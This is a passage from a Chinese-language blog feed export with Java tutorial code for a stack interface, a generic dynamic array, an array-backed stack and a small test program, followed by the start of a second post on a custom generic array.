<h1 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈 Stack"></a>栈 Stack</h1><blockquote>
<ul>
<li><h2 id="只能从一端放入元素，后进先出"><a href="#只能从一端放入元素，后进先出" class="headerlink" title="只能从一端放入元素，后进先出"></a>只能从一端放入元素，后进先出</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625151535915.png" alt="image-20210625151535915"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625151550415.png" alt="image-20210625151550415"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="自定义栈和动态数组实现过程截图"><a href="#自定义栈和动态数组实现过程截图" class="headerlink" title="自定义栈和动态数组实现过程截图"></a>自定义栈和动态数组实现过程截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625171952566.png" alt="image-20210625171952566"></p>
<h1 id="自定义栈和动态数组实现完整代码"><a href="#自定义栈和动态数组实现完整代码" class="headerlink" title="自定义栈和动态数组实现完整代码"></a>自定义栈和动态数组实现完整代码</h1><h2 id="Stack-java（栈接口）"><a href="#Stack-java（栈接口）" class="headerlink" title="Stack.java（栈接口）"></a>Stack.java（栈接口）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Array-java-动态数组"><a href="#Array-java-动态数组" class="headerlink" title="Array.java(动态数组)"></a>Array.java(动态数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * data.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length / <span class="number">4</span> &amp;&amp; data.length / <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            resize(data.length / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line">        E[] newData = (E[])<span class="keyword">new</span> Object[newCapacity];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        data = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayStack-java（自定义动态数组栈）"><a href="#ArrayStack-java（自定义动态数组栈）" class="headerlink" title="ArrayStack.java（自定义动态数组栈）"></a>ArrayStack.java（自定义动态数组栈）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    Array&lt;E&gt; array; <span class="comment">//动态数组</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        array = <span class="keyword">new</span> Array&lt;&gt;(capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">()</span></span>&#123;</span><br><span class="line">        array = <span class="keyword">new</span> Array&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.getSize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.getCapacity();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        array.addLast(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array.getLast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(<span class="string">"Stack: "</span>);</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; array.getSize() ; i ++)&#123;</span><br><span class="line">            res.append(array.get(i));</span><br><span class="line">            <span class="keyword">if</span>(i != array.getSize()-<span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">"] top"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Main-java（测试栈的后进先出原理）"><a href="#Main-java（测试栈的后进先出原理）" class="headerlink" title="Main.java（测试栈的后进先出原理）"></a>Main.java（测试栈的后进先出原理）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       ArrayStack&lt;Integer&gt; stack = <span class="keyword">new</span> ArrayStack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i++)&#123;</span><br><span class="line">           stack.push(i);</span><br><span class="line">           System.out.println(stack);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       stack.pop();</span><br><span class="line">       System.out.println(stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-自定义数组的数据结构</title>
    <url>/2021/06/25/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%95%B0%E7%BB%84%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="自定义数组执行结果截图"><a href="#自定义数组执行结果截图" class="headerlink" title="自定义数组执行结果截图"></a>自定义数组执行结果截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210625092414528.png" alt="image-20210625092414528"></p>
<h1 id="自定义泛型数组代码-详解"><a href="#自定义泛型数组代码-详解" class="headerlink" title="自定义泛型数组代码(详解)"></a>自定义泛型数组代码(详解)</h1><h2 id="Array-java（自定义泛型数组）"><a href="#Array-java（自定义泛型数组）" class="headerlink" title="Array.java（自定义泛型数组）"></a>Array.java（自定义泛型数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Array is full."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span 